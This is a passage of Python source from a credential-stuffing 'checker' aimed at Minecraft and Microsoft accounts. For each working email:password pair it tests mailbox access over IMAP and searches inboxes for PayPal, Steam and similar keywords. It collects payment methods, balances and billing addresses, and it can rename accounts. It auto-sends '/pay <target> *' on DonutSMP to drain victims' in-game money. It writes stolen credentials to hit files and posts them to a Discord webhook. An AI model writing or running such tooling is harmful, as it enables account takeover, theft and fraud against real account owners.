                            else:
                                try:
                                    pattern = r'\[(VIP\+?|MVP\+\+?|YOUTUBE|ADMIN|MOD|HELPER)\]\s*' + re.escape(self.name)
                                    match_brute = re.search(pattern, tx, re.IGNORECASE)
                                    if match_brute:
                                        self.hypixl = match_brute.group(0) 
                                except:
                                    pass
                        if self.hypixl and ('View player,' in self.hypixl or 'not found' in self.hypixl.lower() or 'plancke' in self.hypixl.lower()):
                            self.hypixl = 'N/A'
                except:
                    pass
                try:
                    if config.get('hypixellevel'):
                        match = HYPIXEL_LEVEL.search(tx)
                        if match:
                            self.level = match.group()
                except:
                    pass
                try:
                    if config.get('hypixelfirstlogin'):
                        match = FIRST_LOGIN.search(tx)
                        if match:
                            self.firstlogin = match.group()
                except:
                    pass
                try:
                    if config.get('hypixellastlogin'):
                        match = LAST_LOGIN.search(tx)
                        if match:
                            self.lastlogin = match.group()
                except:
                    pass
                try:
                    if config.get('hypixelbwstars'):
                        match = BW_STARS.search(tx)
                        if match:
                            self.bwstars = match.group()
                except:
                    pass
        except:
            errors += 1
    def optifine(self):
        if config.get('optifinecape') and config.get('optifine_cape', True):
            try:
                txt = self.session.get(f'https://optifine.net/capes/{self.name}.png', proxies=getproxy() if not is_no_proxy() else None, verify=False, timeout=8).text
                if 'Not found' in txt:
                    self.cape = 'No'
                else:
                    self.cape = 'Yes'
            except:
                self.cape = 'Unknown'
    def full_access(self):
        global mfa, sfa
        if config.get('access') and config.get('email_access', True):
            try:
                try:
                    domain = self.email.split('@')[1].lower()
                except IndexError:
                    self.access = 'False'
                    sfa += 1
                    return
                imap_server = ''
                if 'gmail.com' in domain or 'googlemail.com' in domain:
                    imap_server = 'imap.gmail.com'
                elif 'yahoo' in domain:
                    imap_server = 'imap.mail.yahoo.com'
                elif 'outlook' in domain or 'hotmail' in domain or 'live' in domain:
                    imap_server = 'outlook.office365.com'
                elif 'icloud' in domain or 'me.com' in domain or 'mac.com' in domain:
                    imap_server = 'imap.mail.me.com'
                elif 'aol.com' in domain:
                    imap_server = 'imap.aol.com'
                else:
                    imap_server = f'imap.{domain}'
                if not imap_server:
                     imap_server = f'imap.{domain}'
                try:
                    mail = imaplib.IMAP4_SSL(imap_server, timeout=10)
                    mail.login(self.email, self.password)
                    mail.logout()
                    self.access = 'True'
                    mfa += 1
                    if config.get('mark_mfa', True):
                        rank_str = f' | {self.hypixl}' if self.hypixl and self.hypixl != 'N/A' else ''
                        write_dedupe(fname, 'MFA.txt', f'{self.email}:{self.password}{rank_str}\n')
                except imaplib.IMAP4.error as e:
                    err_msg = str(e).lower()
                    if any(k in err_msg for k in ['authentication failed', 'invalid credentials', 'login failed', '[authenticationfailed]']):
                        sfa += 1
                        self.access = 'False'
                        if config.get('mark_sfa', True):
                            write_dedupe(fname, 'SFA.txt', f'{self.email}:{self.password}\n')
                    else:
                        self.access = 'Unknown'
                except Exception as e:
                    self.access = 'Unknown'
            except:
                self.access = 'Unknown'
    def namechange(self):
        global retries
        if (config.get('namechange') or config.get('lastchanged')) and (config.get('name_change_availability', True) or config.get('last_name_change', True)):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, timeout=10)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') and config.get('name_change_availability', True):
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                                self.namechange_available = data.get('nameChangeAllowed', False)
                            if config.get('lastchanged') and config.get('last_name_change', True):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%S.%fZ')
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, '%Y-%m-%dT%H:%M:%SZ')
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime('%m/%d/%Y')
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = difference.days % 365 // 30
                                    days = difference.days
                                    if years > 0:
                                        self.lastchanged = f"{years} {('year' if years == 1 else 'years')} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {('month' if months == 1 else 'months')} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {('day' if days == 1 else 'days')} - {formatted} - {created_at}"
                                    break
                        except:
                            pass
                    if check.status_code == 429:
                        if len(proxylist) < 5:
                            time.sleep(0.5)
                except:
                    pass
                tries += 1
    def check_country(self):

        country = 'Unknown'
        try:
            ms_checker = MicrosoftChecker(self.session, self.email, self.password, config, fname)
            country = ms_checker.check_country()
        except Exception:
            pass
        if country and country != 'Unknown':
            self.country = country
        return country
    def check_donut_smp(self):
        if not config.get('donut_stats', True):
            return
        if not self.name or self.name == 'N/A':
            if UI_ENABLED and ui:
                ui.log_info('Donut SMP: skipped (username unavailable)')
            return
        try:
            donut_api_url = DONUT_API_URL
            donut_api_key = config.get('donut_api_key', '')
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json'}
            if donut_api_key:
                headers['Authorization'] = f'Bearer {donut_api_key}'
                headers['x-api-key'] = str(donut_api_key)

            try:
                proxy_config = getproxy() if proxytype != "'4'" else None
            except Exception:
                proxy_config = None
            response = None
            for _attempt in range(3):
                try:
                    r = self.session.get(f'{donut_api_url}{self.name}', headers=headers,
                                         proxies=proxy_config, verify=False, timeout=12)
                    if r.status_code in (200, 401, 404, 429):
                        response = r
                        break
                    elif r.status_code >= 500:
                        if UI_ENABLED and ui:
                            ui.log_info(f'Donut SMP: server error {r.status_code} attempt {_attempt+1}')
                        continue
                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                    if UI_ENABLED and ui:
                        ui.log_info(f'Donut SMP: connection failed attempt {_attempt+1} - {e.__class__.__name__}')

                    proxy_config = None
                    continue
                except Exception:
                    break
            if response is None:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Connection failed after retries')
                return
            if response.status_code == 200:
                try:
                    data = response.json()
                except Exception:
                    data = None
                stats_data = None
                if isinstance(data, dict):
                    if 'result' in data and isinstance(data['result'], dict):
                        stats_data = data['result']
                if isinstance(stats_data, dict):
                    stats_lines = []
                    stats_lines.append(f'{self.email}:{self.password}')
                    stats_lines.append(f'Username: {self.name}')
                    for key in ('broken_blocks', 'deaths', 'kills', 'mobs_killed', 'money', 'money_made_from_sell', 'money_spent_on_shop', 'placed_blocks', 'playtime'):
                        val = stats_data.get(key)
                        if val is not None:
                            if key == 'playtime':
                                try:
                                    stats_lines.append(f'playtime: {val} ({self._format_seconds(val)})')
                                except Exception:
                                    stats_lines.append(f'playtime: {val}')
                            else:
                                stats_lines.append(f'{key}: {val}')
                    if self.banned is not None:
                        if self.banned and self.banned != 'False' and not str(self.banned).startswith('[Error]') and not str(self.banned).startswith('[Unchecked]'):
                            stats_lines.append('banned: true')
                        else:
                            stats_lines.append('banned: false')
                    if len(stats_lines) >= 2:
                        stats_content = '\n'.join(stats_lines) + '\n' + '=' * 50 + '\n'
                        write_dedupe(fname, 'donut_stats.txt', stats_content)
                        if UI_ENABLED and ui:
                            ui.log_info(f'Donut SMP stats saved for {self.name}')
            elif response.status_code == 404:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP: player not found')
            elif response.status_code == 401:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Invalid API key')
            elif response.status_code == 429:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Rate limited')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_info(f'Donut SMP error: {str(e)[:100]}')

    def autopay_donutsmp(self):
        if not MINECRAFT_AVAILABLE:
            return
        if not config.get('donutsmp_autopay', False):
            return
        pay_target = config.get('donutsmp_pay_username', '')
        if not pay_target or pay_target in ('YOUR_USERNAME', ''):
            return
        if not self.name or self.name == 'N/A':
            return
        def _do_autopay():
            connection = None
            try:
                auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
                auth_token.profile = Profile(id_=self.uuid, name=self.name)
                server_host = config.get('donutsmp_server', 'east.donutsmp.net')
                try:
                    socket.gethostbyname(server_host)
                except (socket.gaierror, Exception):
                    server_host = 'east.donutsmp.net'
                connection = Connection(server_host, 25565, auth_token=auth_token, initial_version=47, allowed_versions={47})

                @connection.listener(clientbound_play.JoinGamePacket)
                def on_join(packet):
                    def delayed_pay():
                        try:
                            time.sleep(1.5)
                            if UI_ENABLED and ui:
                                ui.log_info(f"Donut SMP: Sending /pay {pay_target} * from {self.name}")
                            chat = ChatPacket(message=f"/pay {pay_target} *")
                            connection.write_packet(chat)
                            with stats_lock:
                                global autopay_count
                                autopay_count += 1
                            write_dedupe(fname, 'donutsmp_autopay.txt', f'{self.email}:{self.password} | Sent /pay {pay_target} * (Name: {self.name})\n')
                            time.sleep(0.5)
                            if UI_ENABLED and ui:
                                ui.log_info(f"Donut SMP: AutoPay sent for {self.name}")
                            connection.disconnect()
                        except Exception:
                            pass
                    threading.Thread(target=delayed_pay, daemon=True).start()

                @connection.listener(clientbound_login.DisconnectPacket)
                def on_disconnect_login(packet):
                    pass

                @connection.listener(clientbound_play.DisconnectPacket)
                def on_disconnect_play(packet):
                    pass

                connection.connect()
                time.sleep(1.5)
                if connection and getattr(connection, 'networking_thread', None):
                    try:
                        connection.disconnect()
                    except Exception:
                        pass
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"DonutSMP Autopay error: {str(e)[:50]}")
        threading.Thread(target=_do_autopay, daemon=True).start()
    def ban(self, session):
        global errors
        if not MINECRAFT_AVAILABLE:
            self.banned = '[Error] pyCraft Missing'
            return
        if not config.get('hypixelban'):
            self.banned = '[Unchecked] Disabled in config'
            return
        if self.ban_checked:
            return
        self.ban_checked = True
        try:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={47})
                
                original_handle_exception = connection._handle_exception
                def safe_handle_exception(e, exc_info):
                    try:
                        error_str = str(e)
                        if 'RateLimiter disallowed' in error_str or '429' in error_str:
                            try:
                                self.banned = '[Error] Rate Limit'
                            except:
                                pass
                            return
                        if 'SSLError' in error_str or 'EOF occurred' in error_str:
                             try:
                                 self.banned = '[Error] Connection/SSL'
                             except:
                                 pass
                             return
                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and hasattr(e, 'winerror') and e.winerror == 10053):
                            return
                        if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
                            return
                        if isinstance(e, ValueError) and "closed file" in error_str:
                            return
                        if isinstance(e, requests.exceptions.RequestException):
                            try:
                                 self.banned = '[Error] Connection'
                            except:
                                 pass
                            return
                        if 'multiplayer.access.banned' in error_str or (MINECRAFT_AVAILABLE and isinstance(e, YggdrasilError)):
                             try:
                                 self.banned = f"[Ban] {error_str}"
                             except:
                                 pass
                             return
                    except:
                        pass
                    original_handle_exception(e, exc_info)
                connection._handle_exception = safe_handle_exception
                
                @connection.listener(clientbound_login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    try:
                        data = json.loads(str(packet.json_data))
                        data_str = str(data)
                        if 'temporarily banned' in data_str:
                            try:
                                duration = data['extra'][4]['text'].strip()
                                ban_id = data['extra'][8]['text'].strip()
                                self.banned = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                            except:
                                self.banned = "Temporarily Banned"
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'Suspicious activity' in data_str:
                            try:
                                ban_id = data['extra'][6]['text'].strip()
                                self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                            except:
                                self.banned = "[Permanently] Suspicious activity"
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'You are permanently banned from this server!' in data_str:
                            try:
                                reason = data['extra'][2]['text'].strip()
                                ban_id = data['extra'][6]['text'].strip()
                                self.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                            except:
                                self.banned = "[Permanently] Banned"
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'The Hypixel Alpha server is currently closed!' in data_str:
                            self.banned = 'False'
                            if UI_ENABLED and ui:
                                ui.increment_stat('unbanned')
                        elif 'Failed cloning your SkyBlock data' in data_str:
                            self.banned = 'False'
                            if UI_ENABLED and ui:
                                ui.increment_stat('unbanned')
                        else:
                            extra_list = data.get('extra', [])
                            full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                            if not full_msg:
                                full_msg = data.get('text', '')
                            self.banned = full_msg if full_msg else str(data)
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                    except Exception as e:
                        self.banned = f"Error parsing ban: {str(e)}"
                
                @connection.listener(clientbound_play.DisconnectPacket, early=True)
                def play_disconnect(packet):
                    login_disconnect(packet)

                def _mark_unbanned(packet_name):
                    if self.banned is None:
                        self.banned = 'False'
                        if UI_ENABLED and ui:
                            ui.increment_stat('unbanned')
                            ui.log_info(f'Unbanned detected ({packet_name}): {self.name}')
                        def delayed_disconnect():
                            time.sleep(1.0)
                            connection.disconnect()
                        threading.Thread(target=delayed_disconnect).start()
                @connection.listener(clientbound_play.JoinGamePacket, early=True)
                def joined_server(packet):
                    _mark_unbanned('JoinGame')
                @connection.listener(clientbound_play.KeepAlivePacket, early=True)
                def keep_alive(packet):
                    _mark_unbanned('KeepAlive')
                @connection.listener(clientbound_play.PlayerPositionAndLookPacket, early=True)
                def position_look(packet):
                    _mark_unbanned('PosLook')
                @connection.listener(clientbound_play.TimeUpdatePacket, early=True)
                def time_update(packet):
                    _mark_unbanned('TimeUpdate')
                @connection.listener(clientbound_play.RespawnPacket, early=True)
                def respawn(packet):
                    _mark_unbanned('Respawn')
                try:
                    try:
                        connected = False
                        if len(banproxies) > 0:
                            with proxy_lock:
                                proxy = random.choice(banproxies)
                                if '@' in proxy:
                                    atsplit = proxy.split('@')
                                    connection.networking_proxy = (socks.SOCKS5, atsplit[1].split(':')[0], int(atsplit[1].split(':')[1]), True, atsplit[0].split(':')[0], atsplit[0].split(':')[1])
                                else:
                                    ip_port = proxy.split(':')
                                    connection.networking_proxy = (socks.SOCKS5, ip_port[0], int(ip_port[1]), True)
                                
                                _old_socket = socket.socket
                                class ProxySocket(socks.socksocket):
                                    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, *args, **kwargs):
                                        super().__init__(family, type, proto, *args, **kwargs)
                                        if hasattr(connection, 'networking_proxy') and connection.networking_proxy:
                                            self.set_proxy(*connection.networking_proxy)
                                socket.socket = ProxySocket
                                try:
                                    connection.connect()
                                finally:
                                    socket.socket = _old_socket
                        else:
                            connection.connect()

                        connected = True
                        c = 0
                        while self.banned == None and c < 600:
                            time.sleep(0.01)
                            c += 1
                        connection.disconnect()
                    except:
                        pass
                    
                    if self.banned is None:
                        self.banned = '[Error] Connection Timeout/No Packet'

                    if self.banned and str(self.banned).startswith('[Error]'):
                        if tries < maxretries - 1:
                            self.banned = None
                            time.sleep(1)
                            tries += 1
                            continue

                    if self.banned != None:
                        break
                    tries += 1
                except Exception:
                    pass
        except Exception as e:
            self.banned = f'[Error] Exception in ban: {e}'
            errors += 1
    def setname(self):
        name_format = config.get('name')
        newname = name_format
        while '{random_letter}' in newname:
            newname = newname.replace('{random_letter}', random.choice(string.ascii_lowercase), 1)
        while '{random_number}' in newname:
            newname = newname.replace('{random_number}', random.choice(string.digits), 1)
        while '{random_string}' in newname:
            newname = newname.replace('{random_string}', ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)), 1)
        if newname == name_format and len(newname) < 13:
            newname = f"{newname}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=3))}"
        tries = 0
        while tries < maxretries:
            try:
                changereq = self.session.put('https://api.minecraftservices.com/minecraft/profile/name/' + newname, headers={'Authorization': f'Bearer {self.token}'})
                if changereq.status_code == 200:
                    self.type = self.type + ' [SET MC]'
                    self.name = self.name + f' -> {newname}'
                    break
                elif changereq.status_code == 429:
                    time.sleep(0.5)
            except:
                pass
            tries += 1
    def setskin(self):
        tries = 0
        while tries < maxretries:
            try:
                data = {'url': config.get('skin'), 'variant': config.get('variant')}
                changereq = self.session.post('https://api.minecraftservices.com/minecraft/profile/skins', json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'})
                if changereq.status_code == 200:
                    self.type = self.type + ' [SET SKIN]'
                    break
                elif changereq.status_code == 429:
                    time.sleep(0.5)
            except:
                pass
            tries += 1
    def build_json_capture(self):
        capture_data = {'username': self.name if self.name != 'N/A' else '', 'hypixel_rank': self.hypixl if self.hypixl else 'N/A', 'email': self.email, 'password': self.password, 'account_type': self.type, 'first_login': self.firstlogin if self.firstlogin else '', 'last_login': self.lastlogin if self.lastlogin else '', 'hypixel_level': float(self.level) if self.level else 0.0, 'bedwars_stars': int(self.bwstars) if self.bwstars else 0, 'skyblock_coins': self.sbcoins if self.sbcoins else 'N/A', 'capes': self.capes.split(', ') if self.capes and self.capes != '' else [], 'optifine_cape': True if self.cape == 'Yes' else False, 'can_change_name': True if self.namechanged == 'True' else False, 'last_name_change': self.lastchanged if self.lastchanged else '', 'banned': True if self.banned and self.banned != 'False' else False}
        if capture_data['banned']:
            ban_info = self._parse_ban_info(self.banned)
            if ban_info.get('ban_id'):
                capture_data['ban_id'] = ban_info['ban_id']
            if ban_info.get('duration'):
                capture_data['ban_duration'] = ban_info['duration']
        return capture_data
    def _parse_ban_info(self, ban_text):
        ban_info = {}
        if not ban_text or not isinstance(ban_text, str):
            return ban_info
        ban_id_match = re.search('Ban ID: ([A-Za-z0-9]+)', ban_text)
        if ban_id_match:
            ban_info['ban_id'] = ban_id_match.group(1)
        if 'Permanently' in ban_text or 'permanently' in ban_text:
            ban_info['duration'] = 'Permanently'
            ban_info['ban_days'] = None
        else:
            duration_match = re.search('\\[([^\\]]+)\\]', ban_text)
            if duration_match:
                duration_text = duration_match.group(1)
                if 'Permanently' not in duration_text and 'permanently' not in duration_text:
                    ban_days = self._duration_to_days(duration_text)
                    if ban_days is not None:
                        ban_info['ban_days'] = ban_days
                        ban_info['duration'] = self._format_duration_short(duration_text, ban_days)
                    else:
                        ban_info['duration'] = duration_text
        if 'Suspicious activity' in ban_text:
            ban_info['reason'] = 'Suspicious activity'
        ban_info['full_message'] = ban_text
        return ban_info
    def _format_duration_short(self, original_text, total_days):
        try:
            text_lower = original_text.lower()
            hour_matches = re.findall('(\\d+)\\s*(?:hour|hours|h)\\b', text_lower)
            if hour_matches and 'day' not in text_lower and ('week' not in text_lower) and ('month' not in text_lower):
                total_hours = sum((int(h) for h in hour_matches))
                return f'{total_hours}h'
            week_matches = re.findall('(\\d+)\\s*(?:week|weeks|w)\\b', text_lower)
            if week_matches and 'day' not in text_lower and ('month' not in text_lower):
                total_weeks = sum((int(w) for w in week_matches))
                return f'{total_weeks}w'
            month_matches = re.findall('(\\d+)\\s*(?:month|months|mo|m)\\b', text_lower)
            if month_matches and 'week' not in text_lower and ('day' not in text_lower):
                total_months = sum((int(m) for m in month_matches))
                if total_months == 1:
                    return '4w'
                return f'{total_months * 30}d'
            return f'{total_days}d'
        except:
            return original_text
    def _duration_to_days(self, text):
        if not text:
            return None
        try:
            text_lower = text.lower()
            total_days = 0
            day_matches = re.findall('(\\d+)\\s*(?:day|days|d)\\b', text_lower)
            for match in day_matches:
                total_days += int(match)
            week_matches = re.findall('(\\d+)\\s*(?:week|weeks|w)\\b', text_lower)
            for match in week_matches:
                total_days += int(match) * 7
            month_matches = re.findall('(\\d+)\\s*(?:month|months|mo|m)\\b', text_lower)
            for match in month_matches:
                total_days += int(match) * 30
            year_matches = re.findall('(\\d+)\\s*(?:year|years|y)\\b', text_lower)
            for match in year_matches:
                total_days += int(match) * 365
            if total_days == 0:
                hour_matches = re.findall('(\\d+)\\s*(?:hour|hours|h)\\b', text_lower)
                if hour_matches:
                    hours = sum((int(h) for h in hour_matches))
                    total_days = max(1, (hours + 23) // 24)
            return total_days if total_days > 0 else None
        except:
            return None
    def _format_seconds(self, seconds_value):
        try:
            total_seconds = int(seconds_value)
        except Exception:
            return str(seconds_value)
        if total_seconds < 0:
            total_seconds = 0
        days, rem = divmod(total_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        parts = []
        if days:
            parts.append(f'{days}d')
        if hours:
            parts.append(f'{hours}h')
        if minutes:
            parts.append(f'{minutes}m')
        if not parts:
            parts.append(f'{seconds}s')
        return ' '.join(parts)
    def save_json_capture(self):
        try:
            json_data = self.build_json_capture()
            capture_file = os.path.join(f'results/{fname}', 'capture.txt')
            if os.path.exists(capture_file):
                try:
                    with open(capture_file, 'r', encoding='utf-8') as f:
                        all_captures = json.load(f)
                        if not isinstance(all_captures, list):
                            all_captures = []
                except:
                    all_captures = []
            else:
                all_captures = []
            all_captures.append(json_data)
            with open(capture_file, 'w', encoding='utf-8') as f:
                json.dump(all_captures, f, indent=2, ensure_ascii=False)
            if UI_ENABLED and ui:
                ui.log_info(f'Capture saved: {self.email}')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Failed to save capture: {str(e)[:50]}')

    def check_microsoft_features(self):
        try:
            checker = MicrosoftChecker(self.session, self.email, self.password, config, fname)

            try:
                keywords_str = config.get('inbox_keywords', '')
                if keywords_str and isinstance(keywords_str, str) and keywords_str.strip():
                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                else:
                    keywords = ["steam", "netflix", "Crunchyroll", "discord", "microsoft", "nordvpn", "paypal", "roblox", "epic games", "spotify", "playstation", "xbox"]
                inbox_res = checker.check_inbox(keywords)
                if inbox_res:
                    self.inbox_matches = [f'{k} ({v})' for k, v in inbox_res]
                    for keyword, match_count in inbox_res:
                        if match_count and int(match_count) > 0:
                            clean_kw = "".join([c for c in str(keyword) if c.isalnum() or c in (' ', '_', '-')]).strip()
                            safe_keyword = clean_kw.title().replace(' ', '_') if clean_kw else "Search_Hit"
                            write_dedupe(fname, f'Inboxes/{safe_keyword}.txt', f'{self.email}:{self.password}\n')
                    formatted_results = ', '.join(self.inbox_matches)
                    write_dedupe(fname, 'Inbox.txt', f'{self.email}:{self.password} | Inbox - {formatted_results}\n')
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"MC Inbox Check error: {str(e)[:50]}")

            try:
                p_inst = checker.check_payment_instruments()
                if p_inst:
                    self.ms_payment_methods = p_inst
                    card_line = f"{self.email}:{self.password} | {'; '.join(p_inst)}\n"
                    write_dedupe(fname, 'payment.txt', card_line)
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"MC Payment Check error: {str(e)[:50]}")

            try:
                if config.get('check_microsoft_balance'):
                    bal = checker.check_balance()
                    if bal:
                        self.ms_balance = bal
                        amount_str = re.sub(r'[^\d\.]', '', str(bal))
                        if amount_str and float(amount_str) > 0:
                            bal_line = f'{self.email}:{self.password} | Balance: {bal}\n'
                            write_dedupe(fname, 'balance.txt', bal_line)
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"MC Balance Check error: {str(e)[:50]}")

            try:
                if config.get('check_rewards_points', True):
                    pts = checker.check_rewards_points()
                    if pts:
                        self.ms_rewards = pts
                        pts_line = f'{self.email}:{self.password} | Points: {pts}\n'
                        write_dedupe(fname, 'point.txt', pts_line)
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"MC Rewards Check error: {str(e)[:50]}")

            try:
                if config.get('check_subscriptions'):
                    subs = checker.check_subscriptions()
                    if subs:
                        self.ms_subscriptions = subs
                        write_dedupe(fname, 'Subscriptions.txt', f"{self.email}:{self.password} | Subs: {', '.join(subs)}\n")
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"MC Subscriptions Check error: {str(e)[:50]}")

            try:
                if config.get('check_billing_address'):
                    addrs = checker.check_billing_address()
                    if addrs:
                        self.ms_billing_addresses = addrs
                        write_dedupe(fname, 'Billing_Addresses.txt', f"{self.email}:{self.password} | Address: {'; '.join(addrs)}\n")
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"MC Billing Check error: {str(e)[:50]}")
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f"MC Features error: {str(e)[:50]}")

    def handle(self, session):
        global hits, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors

        try:
            write_dedupe(fname, 'Hits.txt', f'{self.email}:{self.password}\n')
            with stats_lock:
                hits += 1
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Failed to write Hit: {e}')

        def _enrich():
            global minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
            if self.name and self.name != 'N/A':
                try: self.hypixel()
                except Exception: pass
                try:
                    self.optifine()
                    if self.cape == 'Yes': optifine_capes += 1
                except Exception: pass
                if self.capes and self.capes != '': minecraft_capes += 1
                try: self.full_access()
                except Exception: pass
                try:
                    self.namechange()
                    if self.namechange_available: name_changes += 1
                except Exception: pass
                try: self.ban(session)
                except Exception as e:
                    self.banned = f'[Error] Ban execution: {e}'
                try:
                    self.check_country()
                except Exception:
                    pass
                try:
                    self.check_microsoft_features()
                    if self.ms_payment_methods: payment_methods += len(self.ms_payment_methods)
                    if self.inbox_matches: inbox_matches += len(self.inbox_matches)
                except Exception: pass
                if config.get('setname'):
                    try: self.setname()
                    except Exception: pass
            else:
                self.banned = '[Unchecked] No Profile'

                try:
                    self.check_microsoft_features()
                    if self.ms_payment_methods: payment_methods += len(self.ms_payment_methods)
                    if self.inbox_matches: inbox_matches += len(self.inbox_matches)
                except Exception: pass
                try: self.setname()
                except Exception: pass
            try: self.check_donut_smp()
            except Exception: pass
            try: self.autopay_donutsmp()
            except Exception: pass
            if config.get('setskin'):
                try: self.setskin()
                except Exception: pass
            try:
                fullcapt = self.builder(mask_password=False, include_timestamp=False)
                masked_capt = self.builder(mask_password=True, include_timestamp=True)
            except Exception:
                fullcapt = f'{self.email}:{self.password}'
                masked_capt = f'{self.email}:***'
            try:
                stats_text = fetch_meowapi_stats(self.name, self.uuid)
                if stats_text:
                    sw = re.search(r'SW: (\d+)', stats_text)
                    if sw: self.swstars = sw.group(1)
                    nw = re.search(r'NW: ([^ ]+)', stats_text)
                    if nw: self.sbnetworth = nw.group(1)
                    purse = re.search(r'Purse: ([^ ]+)', stats_text)
                    if purse: self.sbcoins = purse.group(1)
                    pit = re.search(r'Pit_Gold: ([^ ]+)', stats_text)
                    if pit: self.pitcoins = pit.group(1)
                    fullcapt = self.builder(mask_password=False, include_timestamp=False)
                    masked_capt = self.builder(mask_password=True, include_timestamp=True)
            except Exception:
                stats_text = None
            try:
                write_dedupe(fname, 'Capture.txt', fullcapt + '\n')
                if self.namechange_available:
                    write_dedupe(fname, 'Namechangeable.txt', fullcapt + '\n')
                if self.banned == 'False':
                    write_dedupe(fname, 'Unbanned.txt', fullcapt + '\n')
                elif self.banned and not str(self.banned).startswith('[Error]') and not str(self.banned).startswith('[Unchecked]') and self.banned != 'Unknown':
                    write_dedupe(fname, 'Banned.txt', fullcapt + '\n')
            except: pass
            if UI_ENABLED and ui:
                ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)

        threading.Thread(target=_enrich, daemon=True).start()
        try:
            self.send_discord_webhook()
        except Exception:
            pass
    def send_discord_webhook(self):
        try:
            enable_notifications = config.get('enable_notifications')
            if enable_notifications is False or str(enable_notifications).lower() == 'false':
                return
            webhook_url = config.get('discord_webhook_url', '')
            if not webhook_url or webhook_url.strip() == '':
                if UI_ENABLED and ui:
                    ui.log_error('[Webhook] No webhook URL configured')
                return
            embed_color = config.get('embed_color_hit', 5763719)
            notification_type = 'Account Hit'
            if 'Xbox Game Pass Ultimate' in str(self.type):
                embed_color = config.get('embed_color_xgp', 3447003)
                notification_type = 'Xbox Game Pass Ultimate'
            elif 'Xbox Game Pass' in str(self.type):
                embed_color = config.get('embed_color_xgp', 3447003)
                notification_type = 'Xbox Game Pass (PC)'
            elif 'Normal Minecraft' in str(self.type):
                embed_color = config.get('embed_color_hit', 5763719)
                notification_type = 'Minecraft Account'
            fields = []
            fields.append({'name': '📧 ᴇᴍᴀɪʟ', 'value': f'`{self.email}`', 'inline': False})
            fields.append({'name': '🔑 ᴘᴀssᴡᴏʀᴅ', 'value': f'`{self.password}`', 'inline': False})
            if self.hypixl and self.hypixl != 'N/A':
                fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.hypixl}`', 'inline': True})
            elif self.name and self.name != 'N/A':
                fields.append({'name': ' ᴜsᴇʀɴᴀᴍᴇ', 'value': f'`{self.name}`', 'inline': True})
            if self.type:
                fields.append({'name': ' ᴛʏᴘᴇ', 'value': str(self.type), 'inline': True})
            if self.capes and self.capes != '':
                fields.append({'name': ' ᴄᴀᴘᴇs', 'value': str(self.capes), 'inline': True})
            if self.level:
                fields.append({'name': ' ʜʏᴘɪxᴇʟ ʟᴇᴠᴇʟ', 'value': str(self.level), 'inline': True})
            if self.bwstars and int(self.bwstars) > 0:
                fields.append({'name': ' ʙᴇᴅᴡᴀʀ sᴛᴀʀs', 'value': str(self.bwstars), 'inline': True})
            if self.sbcoins:
                fields.append({'name': ' sᴋʏʙʟᴏᴄᴋ ᴄᴏɪɴs', 'value': str(self.sbcoins), 'inline': True})
